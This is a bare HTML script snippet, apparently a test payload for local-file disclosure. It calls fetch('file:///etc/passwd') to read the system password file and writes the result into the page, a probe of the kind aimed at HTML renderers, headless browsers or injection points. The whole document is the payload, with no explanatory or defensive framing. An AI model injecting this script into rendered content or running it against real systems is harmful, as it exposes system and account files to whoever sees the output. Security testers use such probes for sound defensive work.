<script>
  fetch('file:///etc/passwd')
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.text();
  })
  .then(data => {
    document.write('received data:', data);
  })
  .catch(error => {
    document.write('fetch_error', error);
  });
</script>
